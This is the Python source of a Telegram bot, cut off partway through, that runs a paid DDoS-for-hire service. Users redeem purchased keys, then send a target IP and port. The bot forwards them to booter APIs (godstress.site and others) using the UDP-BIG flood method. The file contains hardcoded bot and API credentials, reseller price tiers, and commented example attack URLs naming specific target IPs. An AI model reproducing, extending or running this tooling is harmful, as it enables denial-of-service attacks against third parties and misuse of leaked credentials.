# - Complete Working Bot with Individual Cooldown & Multiple Attacks
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import requests
import psutil
import traceback
import time
import logging
import pytz
from datetime import datetime, timedelta
import json
from apscheduler.schedulers.background import BackgroundScheduler

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ============ CONFIGURATION ============
# ⚠️ SECURE YOUR TOKEN: Set this in your server environment variables
BOT_TOKEN = "8752171593:AAG5FvK5zNfLjV1pOIYchwXzWrivIGMx6NY"

# ============ ADMIN & OWNER CONFIGURATION ============
BOT_OWNER = 8626582205  # Owner ID (Sirf isko cooldown nahi lagega)

# Admin list - Inko cooldown lagega (normal users ki tarah)
ADMIN_IDS = []

pending_links = {}
pending_redemptions = {} 
admin_attack_stats = {}  

# ============ API CONFIGURATION ============
# Default fallback API configuration. (Can be overridden by /url and /key commands)
API_LIST = [
    {
        "name": "Pro20N",
        "url": "http://13.232.68.73:3938/attack",
        "key": "qpMZA6JPG7ZDx4gC9cPoO3uO6YLlaOWq",  # 3 conc limit
        "concurrent": 1,
        "max_time": 300,           
        "enabled": False,
        "timeout": 30
    },
    # {
        # "name": "GODx",
        # "url": "https://apiv2.godstress.site/api/attack",
        # "key": "636AD2B22A95A4A6752D9CCFD593D89E",  # 2 conc limit
        # "concurrent": 1,
        # "method": "UDP-BIG",
        # "max_time": 300,           
        # "enabled": True,
        # "timeout": 30
    # },
    {
        "name": "GOD2",
        "url": "https://god.godstress.site/api/v1/attack/start",
        "key": "nk_97150576d9bc9ab445a7809b55ff55e0",  # 2 conc limit
        "concurrent": 1,
        "method": "UDP-BIG",
        "max_time": 300,           
        "enabled": True,
        "timeout": 30
    }
    
    
]

#http://god.godstress.site/api/v1/attack/start?key=nk_56ac5bc43ea5c0be5f5bd945d324ff53&ip=TARGET_IP&port=PORT&time=120

#https://retrostress.net/api/start?key=23c9852c9716a375ef6acd25f5f636426668f476855ddcd99073f69de0e7dcb1&target=34.0.12.128&port=10166&time=60&method=UDP-BIG

#https://apiv2.godstress.site/api/attack?target=1.1.1.1&port=80&time=60&method=UDP-BIG&api_key=636AD2B22A95A4A6752D9CCFD593D89E

def get_enabled_apis():
    return [api for api in API_LIST if api['enabled']]

def select_random_api():
    enabled_apis = get_enabled_apis()
    if not enabled_apis:
        return None
    return random.choice(enabled_apis)

# ============ BLOCKED PORTS ============
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030]

def is_port_blocked(port):
    return port in BLOCKED_PORTS

def add_blocked_port(port):
    if port not in BLOCKED_PORTS:
        BLOCKED_PORTS.append(port)
        return True
    return False

def remove_blocked_port(port):
    if port in BLOCKED_PORTS:
        BLOCKED_PORTS.remove(port)
        return True
    return False

def get_blocked_ports():
    return BLOCKED_PORTS.copy()

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_admin(user_id):
    return user_id in ADMIN_IDS and user_id != BOT_OWNER
    
# Attack settings
MIN_ATTACK_TIME = 30
DEFAULT_MAX_ATTACK_TIME = 200
DEFAULT_USER_COOLDOWN = 200
DEFAULT_MAX_SLOTS = 2
MAX_SLOTS_LIMIT = 10
REDEEM_LIMIT = 2 

# ============ TIMEZONE CONFIGURATION ============
IST = pytz.timezone('Asia/Kolkata') 
scheduler = BackgroundScheduler(timezone=IST)
scheduler.start()
user_max_time = {}

# ============ DUAL COOLDOWN SETTINGS ============
FAST_COOLDOWN_SECONDS = 300
MAIN_COOLDOWN_SECONDS = 0

# Reseller pricing
RESELLER_PRICING = {
    '30m': {'price': 20, 'seconds': 30 * 60, 'label': '30 Minutes'}, 
    '1h': {'price': 30, 'seconds': 1 * 3600, 'label': '1 Hour'},
    '2h': {'price': 40, 'seconds': 2 * 3600, 'label': '2 Hour'},
    '6h': {'price': 50, 'seconds': 6 * 3600, 'label': '6 Hours'},
    '12h': {'price': 70, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 120, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 300, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 600, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 2200, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 4100, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

# ============ DATA STORAGE ============
DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)

KEYS_FILE = os.path.join(DATA_DIR, "keys.json")
USERS_FILE = os.path.join(DATA_DIR, "users.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
ATTACK_LOGS_FILE = os.path.join(DATA_DIR, "attack_logs.json")
BOT_USERS_FILE = os.path.join(DATA_DIR, "bot_users.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
USER_MAX_TIME_FILE = os.path.join(DATA_DIR, "user_max_time.json")
SLOTS_FILE = os.path.join(DATA_DIR, "slots.json")          
WHITELIST_FILE = os.path.join(DATA_DIR, "attacklist_whitelist.json")

# 🔥 CRITICAL FIX: Global File Lock for Database Integrity
file_lock = threading.Lock()

def load_json(file_path, default=None):
    if default is None:
        default = {}
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(file_path, data):
    with file_lock:
        with open(file_path, 'w') as f:
            json.dump(data, f, indent=2, default=str)

# ============ USER MAX TIME FUNCTIONS ============
def load_user_max_time():
    global user_max_time
    user_max_time = load_json(USER_MAX_TIME_FILE, {})
    
def set_user_max_time(user_id, max_time):
    user_max_time[str(user_id)] = max_time
    save_user_max_time()
    return True

def get_user_max_time(user_id):
    if is_owner(user_id):
        return 999 
    if str(user_id) in user_max_time:
        return user_max_time[str(user_id)]
    return get_max_attack_time() 

def remove_user_max_time(user_id):
    if str(user_id) in user_max_time:
        del user_max_time[str(user_id)]
        save_user_max_time()
        return True
    return False

def save_user_max_time():
    save_json(USER_MAX_TIME_FILE, user_max_time) 
    
def get_attacklist_whitelist():
    return load_json(WHITELIST_FILE, [])

def save_attacklist_whitelist(whitelist_list):
    save_json(WHITELIST_FILE, whitelist_list)

def is_whitelisted_for_attacklist(user_id):
    if is_owner(user_id) or is_admin(user_id):
        return True
    whitelist = get_attacklist_whitelist()
    return int(user_id) in whitelist
    
def get_keys(): return load_json(KEYS_FILE, {})
def save_keys(keys): save_json(KEYS_FILE, keys)
def get_users(): return load_json(USERS_FILE, {})
def save_users(users): save_json(USERS_FILE, users)
def get_resellers(): return load_json(RESELLERS_FILE, {})
def save_resellers(resellers): save_json(RESELLERS_FILE, resellers)
def get_attack_logs(): return load_json(ATTACK_LOGS_FILE, [])
def save_attack_logs(logs): save_json(ATTACK_LOGS_FILE, logs)
def get_bot_users(): return load_json(BOT_USERS_FILE, {})
def save_bot_users(users): save_json(BOT_USERS_FILE, users)
def get_settings(): return load_json(SETTINGS_FILE, {})
def save_settings(settings): save_json(SETTINGS_FILE, settings)

def get_setting(key, default):
    settings = get_settings()
    return settings.get(key, default)

def set_setting(key, value):
    settings = get_settings()
    settings[key] = value
    save_settings(settings)

def get_max_attack_time(): return get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)
def set_max_attack_time(value): set_setting('max_attack_time', value)
def get_max_slots(): return get_setting('max_slots', DEFAULT_MAX_SLOTS)
def set_max_slots(value): set_setting('max_slots', value)
def get_attack_amplification(): return get_setting('attack_amplification', 1)
def set_attack_amplification(value): set_setting('attack_amplification', value)
def get_maintenance_mode(): return get_setting('maintenance_mode', False)

def set_maintenance_mode(value, msg=None):
    set_setting('maintenance_mode', value)
    if msg:
        set_setting('maintenance_msg', msg)

def get_maintenance_msg():
    return get_setting('maintenance_msg', "🔧 Bot is in maintenance mode. Please try again later.")

def auto_delete_key(key_value):
    keys = get_keys()
    if key_value in keys:
        del keys[key_value]
        save_keys(keys)
        logging.info(f"🗑️ Scheduled Deletion: Key {key_value} has been removed.")

def get_blockedips(): return get_setting('blockedips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blockedips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blockedips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blockedips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blockedips', blocked)
        return True
    return False

def get_port_protection(): return get_setting('port_protection', True)
def set_port_protection(value): set_setting('port_protection', value)

# ============ DUAL COOLDOWN SYSTEM ============
user_fast_cooldown = {}   
user_main_cooldown = {}    

def track_admin_attack(admin_id, target, port, duration):
    if admin_id not in admin_attack_stats:
        admin_attack_stats[admin_id] = {
            'total': 0,
            'last_attack': None,
            'attacks': []
        }
    
    admin_attack_stats[admin_id]['total'] += 1
    admin_attack_stats[admin_id]['last_attack'] = datetime.now(IST)
    admin_attack_stats[admin_id]['attacks'].append({
        'target': target,
        'port': port,
        'duration': duration,
        'time': datetime.now(IST)
    })
    
    if len(admin_attack_stats[admin_id]['attacks']) > 50:
        admin_attack_stats[admin_id]['attacks'].pop(0)

def setfastcooldown(user_id):
    user_fast_cooldown[str(user_id)] = datetime.now(IST) + timedelta(seconds=FAST_COOLDOWN_SECONDS)
    return FAST_COOLDOWN_SECONDS

def setmaincooldown(user_id):
    user_main_cooldown[str(user_id)] = datetime.now(IST) + timedelta(seconds=MAIN_COOLDOWN_SECONDS)
    return MAIN_COOLDOWN_SECONDS

def clear_fast_cooldown(user_id):
    user_id_str = str(user_id)
    if user_id_str in user_fast_cooldown:
        del user_fast_cooldown[user_id_str]

def get_main_cooldown_remaining(user_id):
    user_id_str = str(user_id)
    if user_id_str in user_main_cooldown:
        remaining = (user_main_cooldown[user_id_str] - datetime.now(IST)).total_seconds()
        if remaining > 0:
            return int(remaining)
        else:
            del user_main_cooldown[user_id_str]
    return 0

def get_user_cooldown(user_id):
    if is_owner(user_id):
        return 0  
    
    user_id_str = str(user_id)
    fast_remaining = 0
    main_remaining = 0
    
    if user_id_str in user_fast_cooldown:
        remaining = (user_fast_cooldown[user_id_str] - datetime.now(IST)).total_seconds()
        if remaining > 0:
            fast_remaining = int(remaining)
        else:
            del user_fast_cooldown[user_id_str]
    
    if user_id_str in user_main_cooldown:
        remaining = (user_main_cooldown[user_id_str] - datetime.now(IST)).total_seconds()
        if remaining > 0:
            main_remaining = int(remaining)
        else:
            del user_main_cooldown[user_id_str]
    
    return max(fast_remaining, main_remaining)
    
def get_fast_cooldown_remaining(user_id):
    user_id_str = str(user_id)
    if user_id_str in user_fast_cooldown:
        remaining = (user_fast_cooldown[user_id_str] - datetime.now(IST)).total_seconds()
        if remaining > 0:
            return int(remaining)
        else:
            del user_fast_cooldown[user_id_str]
    return 0
    
def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN

# ============ BOT INITIALIZATION ============
bot = telebot.TeleBot(BOT_TOKEN)
BOT_START_TIME = datetime.now(IST)

# ============ GLOBAL VARIABLES ============
active_attacks = {}
api_in_use = {}
_attack_lock = threading.Lock()

def safe_send_message(chat_id, text, reply_to=None, parse_mode=None):
    try:
        time.sleep(0.05) 
        if reply_to:
            return bot.reply_to(reply_to, text, parse_mode=parse_mode)
        else:
            return bot.send_message(chat_id, text, parse_mode=parse_mode)
    except telebot.apihelper.ApiTelegramException as e:
        if e.error_code == 429:
            retry_after = e.result_json.get('parameters', {}).get('retry_after', 1)
            logging.warning(f"Rate limited! Sleeping for {retry_after}s")
            time.sleep(retry_after)
            return safe_send_message(chat_id, text, reply_to, parse_mode)
        logging.error(f"Telegram API Error: {e}")
        return None

def is_reseller(user_id):
    resellers = get_resellers()
    reseller = resellers.get(str(user_id))
    return reseller is not None and not reseller.get('blocked', False)

def get_reseller(user_id):
    resellers = get_resellers()
    return resellers.get(str(user_id))

def get_time_remaining(user_id):
    users = get_users()
    user = users.get(str(user_id))
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
        
    try:
        expiry = datetime.fromisoformat(user['key_expiry'])
        if expiry.tzinfo is None:
            expiry = IST.localize(expiry)
            
        remaining = expiry - datetime.now(IST)
        
        if remaining.total_seconds() <= 0:
            return "0d 0h 0m 0s"
            
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{days}d {hours}h {minutes}m {seconds}s"
    except:
        return "0d 0h 0m 0s"

def has_valid_key(user_id):
    users = get_users()
    user = users.get(str(user_id))
    if not user or not user.get('key_expiry'):
        return False
    
    try:
        now_ist = datetime.now(IST)
        expiry = datetime.fromisoformat(user['key_expiry'])
        if expiry.tzinfo is None:
            expiry = IST.localize(expiry)
            
        key_start_str = user.get('key_start')
        if key_start_str:
            key_start = datetime.fromisoformat(key_start_str)
            if key_start.tzinfo is None:
                key_start = IST.localize(key_start)
        else:
            key_start = now_ist

        return key_start <= now_ist < expiry

    except Exception as e:
        logging.error(f"Key time-window check error for {user_id}: {e}")
        return False

def get_slot_status():
    with _attack_lock:
        now = datetime.now(IST)
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        busy_slots = len(api_in_use)
        free_slots = get_max_slots() - busy_slots
        return busy_slots, free_slots, get_max_slots()

def get_free_api_index():
    with _attack_lock:
        busy_indices = set(api_in_use.values())
        for i in range(get_max_slots()):
            if i not in busy_indices:
                return i
        return None

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now(IST)
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blockedips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def check_maintenance(message):
    if get_maintenance_mode() and not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if is_owner(user_id):
        return False
    users = get_users()
    user = users.get(str(user_id))
    if user and user.get('banned'):
        return True
    return False

def log_attack(user_id, username, target, port, duration):
    logs = get_attack_logs()
    logs.append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now(IST).isoformat()
    })
    save_attack_logs(logs[-500:])

def track_bot_user(user_id, username=None):
    users = get_bot_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            'user_id': user_id,
            'username': username,
            'first_seen': datetime.now(IST).isoformat()
        }
        save_bot_users(users)

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's': return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm': return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h': return timedelta(hours=value), f"{value} hours"
    elif unit == 'd': return timedelta(days=value), f"{value} days"
    return None, None

def resolve_user(input_str, allow_any_id=True):
    input_str = input_str.strip().lstrip('@')
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    users = get_users()
    for uid, user in users.items():
        if user.get('username') and user['username'].lower() == input_str.lower():
            return int(uid), user['username']
    resellers = get_resellers()
    for rid, reseller in resellers.items():
        if reseller.get('username') and reseller['username'].lower() == input_str.lower():
            return int(rid), reseller['username']
    if input_str.isdigit():
        return int(input_str), None
    return None, None

def send_attack_via_api(api, target, port, duration):
    try:
        current_url = get_setting('api_url', api['url'])
        current_key = get_setting('api_key', api['key'])

        if api.get('method'):
            url = f"{current_url}?key={current_key}&ip={target}&port={port}&time={duration}"
            #url = f"{current_url}?key={current_key}&ip={target}&port={port}&time={duration}&method={api['method']}"
        else:
            url = f"{current_url}?key={current_key}&ip={target}&port={port}&time={duration}"

        response = requests.get(url, timeout=api.get('timeout', 30))
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def start_attack(target, port, duration, message, attack_id, slot_id, selected_api):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        if is_admin(user_id):
            track_admin_attack(user_id, target, port, duration)
            print(f"📊 Admin {user_id} attack tracked! Total: {admin_attack_stats.get(user_id, {}).get('total', 0)}")
        
        api_max_time = selected_api['max_time']
        actual_duration = min(duration, api_max_time)
        
        log_attack(user_id, username, target, port, actual_duration)
        
        safe_send_message(message.chat.id, 
            f"⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!\n"
            f"🎯 𝗧𝗔𝗥𝗚𝗘𝗧: {target}:{port}\n"
            f"⏱️ 𝗧𝗜𝗠𝗘: {duration}s\n"
            f"📊 𝙲𝙷𝙴𝙲𝙺 /status 𝙵𝙾𝚁 𝚄𝙿𝙳𝙰𝚃𝙴𝚂", 
            reply_to=message)
        
        success = send_attack_via_api(selected_api, target, port, actual_duration)
        
        if success:
            print(f"✅ Attack via {selected_api['name']} - Target: {target}:{port} - {actual_duration}s")
        else:
            print(f"❌ Attack failed via {selected_api['name']}")
        
        time.sleep(actual_duration)
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        
        clear_fast_cooldown(user_id)
        setmaincooldown(user_id)
        
        safe_send_message(message.chat.id, 
            f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!\n"
            f"🎯 𝙏𝘼𝙍𝙂𝙀𝙏: {target}:{port}\n"
            f"⏱️ 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉: {actual_duration}s\n"
            f"⏳ 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉: {get_user_cooldown(user_id)}s\n"
            f"⚠️ 𝚈𝙾𝚄 𝙲𝙰𝙽 𝚂𝚃𝙰𝚁𝚃 𝙽𝙴𝙾 𝙰𝚃𝚃𝙰𝙲𝙺 𝙰𝙵𝚃𝙴𝚁 𝙲𝙾𝙾𝙻𝙳𝙊𝙾𝙽 𝙴𝙽𝙳𝚂!", 
            reply_to=message)
        
        print(f"[INFO] Attack by {user_id} via {selected_api['name']} - {actual_duration}/{duration}s")
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        clear_fast_cooldown(user_id)
        print(f"Attack error: {e}")

def build_status_message(user_id):
    attack_active = user_has_active_attack(user_id)
    fast_cd = get_fast_cooldown_remaining(user_id)
    main_cd = get_main_cooldown_remaining(user_id)
    busy_slots, free_slots, total_slots = get_slot_status()
    
    try:
        chat = bot.get_chat(user_id)
        if chat.username:
            username = f"@{chat.username}"
        elif chat.first_name:
            username = chat.first_name
            if username:
                username = username.replace('_', ' ').replace('*', '').replace('`', '')
        else:
            username = str(user_id)
    except:
        username = str(user_id)
    
    response = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += "                     🇸 🇹 🇦 🇹 🇺 🇸 \n"
    response += f"👤𝗨𝗦𝗘𝗥:{username}\n"
    
    if attack_active:
        for attack_id, attack in active_attacks.items():
            if attack.get('user_id') == user_id:
                remaining = int((attack['end_time'] - datetime.now(IST)).total_seconds())
                total = attack['duration']
                elapsed = total - remaining
                progress = int((elapsed / total) * 100)
                
                bar_length = 10
                filled = int(bar_length * progress / 100)
                bar = '🟥' * filled + '⬜' * (bar_length - filled)
                
                response += f"🎯𝗧𝗔𝗥𝗚𝗘𝗧:{attack['target']}:{attack['port']}\n"
                response += f"⏰𝗧𝗜𝗠𝗘 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚:{remaining}𝘀\n"
                response += f"📊 [{bar}] {progress}%\n"
                break
    else:
        response += "💤 𝙽𝙾 𝙰𝙲𝚃𝙸𝚅𝙴 𝙰𝚃𝚃𝙰𝙲𝙺𝚂\n"
    
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"🟢 𝙁𝙍𝙀𝙀 𝙎𝙇𝙊𝙏𝙎:{free_slots}/{total_slots}\n"
    response += f"🔴 𝙐𝙎𝙀𝘿 𝙎𝙇𝙊𝙏𝙎:{busy_slots}/{total_slots}\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    if attack_active:
        response += f"⚡ 𝗙𝗔𝗦𝗧 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: attack already running...\n"
    elif fast_cd > 0:
        response += f"⚡ 𝗙𝗔𝗦𝗧 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: `{fast_cd}s` remaining\n"
    else:
        response += f"✅ 𝗙𝗔𝗦𝗧 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: Ready\n"
    
    if main_cd > 0:
        response += f"🐢 𝗠𝗔𝗜𝗡 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: `{main_cd}s` remaining\n"
    else:
        response += f"✅ 𝗠𝗔𝗜𝗡 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: Ready\n"
    
    if not attack_active and fast_cd == 0 and main_cd == 0:
        response += f"✅ 𝙍𝙀𝘼𝘿𝙔 𝙁𝙊𝙍 𝘼𝙏𝙏𝘼𝘾𝙆!"
    elif main_cd > 0:
        response += f"\n⏳ *Please wait {main_cd}s before next attack*"
        
    return response

def auto_update_status(chat_id, message_id, user_id):
    try:
        for _ in range(60): 
            time.sleep(10) 
            if not user_has_active_attack(user_id) and get_user_cooldown(user_id) == 0:
                break
                
            new_response = build_status_message(user_id)
            try:
                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id)
            except telebot.apihelper.ApiTelegramException as e:
                if "message is not modified" in str(e):
                    continue
                break
    except Exception as e:
        logging.error(f"Auto update error: {e}")

# ============ AUDIT HELPER FUNCTION ============
def get_user_key_details(user_id):
    """Fetches key string, redemption timestamp, and who created the key (Owner vs Reseller)"""
    keys = get_keys()
    resellers = get_resellers()
    
    matched_key = None
    key_code = "N/A"
    redeemed_at = "Unknown"
    generator_name = "Unknown"
    
    user_id_int = int(user_id)
    
    # 1. Search keys.json for matching used_by
    for k, k_info in keys.items():
        if k_info.get('used_by') == user_id_int or str(k_info.get('used_by')) == str(user_id):
            matched_key = k_info
            key_code = k
            break
            
    if matched_key:
        used_at_str = matched_key.get('used_at')
        if used_at_str:
            try:
                used_dt = datetime.fromisoformat(used_at_str).astimezone(IST)
                redeemed_at = used_dt.strftime('%Y-%m-%d %I:%M %p')
            except:
                redeemed_at = used_at_str
        
        created_by = matched_key.get('created_by')
        if created_by:
            if str(created_by) == str(BOT_OWNER):
                generator_name = "👑 Owner"
            else:
                reseller_info = resellers.get(str(created_by), {})
                res_name = reseller_info.get('username') or f"Reseller_{created_by}"
                generator_name = f"💼 {res_name} (`{created_by}`)"
    else:
        # Check user profile fallback if created manually via /add_user
        users = get_users()
        u_info = users.get(str(user_id), {})
        if u_info.get('redeemed_key'):
            key_code = u_info.get('redeemed_key')
        if u_info.get('added_at'):
            try:
                a_dt = datetime.fromisoformat(u_info['added_at']).astimezone(IST)
                redeemed_at = a_dt.strftime('%Y-%m-%d %I:%M %p')
            except:
                pass
        generator_name = "👑 Owner (Manual)"

    return {
        'key': key_code,
        'redeemed_at': redeemed_at,
        'generator': generator_name
    }

# ============ TELEGRAM COMMANDS ============

# ==========================================
# 🔑 KEY MANAGEMENT COMMANDS (VIEW & DELETE)
# ==========================================

@bot.message_handler(commands=["unusedkeys"])
def view_unused_keys(message):
    if not is_owner(message.from_user.id): return
    keys = get_keys()
    unused = [f"• `{k}` ➜ {v.get('duration_label', 'Unknown')}" for k, v in keys.items() if not v.get('used')]
    
    if not unused:
        safe_send_message(message.chat.id, "📋 No unused keys found!")
        return
        
    res = "🔑 **UNUSED KEYS**\n━━━━━━━━━━━━━━━━━━━━\n"
    for item in unused:
        if len(res) + len(item) > 3500:
            safe_send_message(message.chat.id, res, parse_mode="Markdown")
            res = ""
        res += item + "\n"
    res += f"\n━━━━━━━━━━━━━━━━━━━━\n📊 **Total:** {len(unused)}"
    if res.strip():
        safe_send_message(message.chat.id, res, parse_mode="Markdown")

@bot.message_handler(commands=["expiredkeys"])
def view_expired_keys(message):
    if not is_owner(message.from_user.id): return
    keys = get_keys()
    users = get_users()
    now_ist = datetime.now(IST)
    expired = []
    
    for k, v in keys.items():
        if v.get('used') and str(v.get('used_by')) in users:
            uid = str(v.get('used_by'))
            exp_str = users[uid].get('key_expiry')
            if exp_str:
                try:
                    exp_dt = datetime.fromisoformat(exp_str).astimezone(IST)
                    if exp_dt <= now_ist:
                        expired.append(f"• `{k}` ➜ Used by `{uid}`")
                except: pass
                
    if not expired:
        safe_send_message(message.chat.id, "📋 No expired keys found in the database!")
        return
        
    res = "🗑️ **EXPIRED KEYS**\n━━━━━━━━━━━━━━━━━━━━\n"
    for item in expired:
        if len(res) + len(item) > 3500:
            safe_send_message(message.chat.id, res, parse_mode="Markdown")
            res = ""
        res += item + "\n"
    res += f"\n━━━━━━━━━━━━━━━━━━━━\n📊 **Total:** {len(expired)}"
    if res.strip():
        safe_send_message(message.chat.id, res, parse_mode="Markdown")

@bot.message_handler(commands=["delallkeys"])
def delete_all_keys(message):
    if not is_owner(message.from_user.id): return
    keys = get_keys()
    count = len(keys)
    save_keys({}) # Overwrites keys.json with an empty dictionary
    safe_send_message(message.chat.id, f"✅ **DELETED ALL KEYS**\nSuccessfully wiped `{count}` keys from the database.", parse_mode="Markdown")

@bot.message_handler(commands=["delunusedkeys"])
def delete_unused_keys(message):
    if not is_owner(message.from_user.id): return
    keys = get_keys()
    active_keys = {k: v for k, v in keys.items() if v.get('used')}
    deleted = len(keys) - len(active_keys)
    save_keys(active_keys)
    safe_send_message(message.chat.id, f"✅ **DELETED UNUSED KEYS**\nSuccessfully wiped `{deleted}` unredeemed keys.", parse_mode="Markdown")

@bot.message_handler(commands=["delexpiredkeys"])
def delete_expired_keys(message):
    if not is_owner(message.from_user.id): return
    keys = get_keys()
    users = get_users()
    now_ist = datetime.now(IST)
    
    to_keep = {}
    for k, v in keys.items():
        is_expired = False
        if v.get('used') and str(v.get('used_by')) in users:
            exp_str = users[str(v.get('used_by'))].get('key_expiry')
            if exp_str:
                try:
                    exp_dt = datetime.fromisoformat(exp_str).astimezone(IST)
                    if exp_dt <= now_ist:
                        is_expired = True
                except: pass
        if not is_expired:
            to_keep[k] = v
            
    deleted = len(keys) - len(to_keep)
    save_keys(to_keep)
    safe_send_message(message.chat.id, f"✅ **DELETED EXPIRED KEYS**\nSuccessfully wiped `{deleted}` expired keys from the database.", parse_mode="Markdown")

@bot.message_handler(commands=["delactivekeys"])
def delete_active_keys(message):
    if not is_owner(message.from_user.id): return
    keys = get_keys()
    users = get_users()
    now_ist = datetime.now(IST)
    
    to_keep = {}
    for k, v in keys.items():
        is_active = False
        if v.get('used') and str(v.get('used_by')) in users:
            exp_str = users[str(v.get('used_by'))].get('key_expiry')
            if exp_str:
                try:
                    exp_dt = datetime.fromisoformat(exp_str).astimezone(IST)
                    if exp_dt > now_ist:
                        is_active = True
                except: pass
        if not is_active:
            to_keep[k] = v
            
    deleted = len(keys) - len(to_keep)
    save_keys(to_keep)
    
    text = (
        f"✅ **DELETED ACTIVE KEYS**\n"
        f"Successfully wiped `{deleted}` active keys from the keys database.\n\n"
        f"⚠️ *Note: This only deletes the keys from the history ledger. It does NOT ban the users. To completely revoke user access, you must use `/cleanexpired` or `/removeuser`.*"
    )
    safe_send_message(message.chat.id, text, parse_mode="Markdown")
    
    
@bot.message_handler(commands=["url"])
def change_url_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return

    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        current_url = get_setting('api_url', API_LIST[0]['url'])
        safe_send_message(message.chat.id, f"⚠️ Usage: /url <new_url>\nCurrent URL: `{current_url}`", reply_to=message, parse_mode="Markdown")
        return

    new_url = command_parts[1].strip()
    set_setting('api_url', new_url)
    
    API_LIST[0]['url'] = new_url
    safe_send_message(message.chat.id, f"✅ API URL successfully updated to:\n`{new_url}`\n\nAll future attacks will use this URL.", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["key"])
def change_key_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return

    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        current_key = get_setting('api_key', API_LIST[0]['key'])
        safe_send_message(message.chat.id, f"⚠️ Usage: /key <new_key>\nCurrent Key: `{current_key}`", reply_to=message, parse_mode="Markdown")
        return

    new_key = command_parts[1].strip()
    set_setting('api_key', new_key)
    
    API_LIST[0]['key'] = new_key
    safe_send_message(message.chat.id, f"✅ API Key successfully updated to:\n`{new_key}`\n\nAll future attacks will use this Key.", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"`{user_id}`", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now(IST)
    total_users = len(get_users())
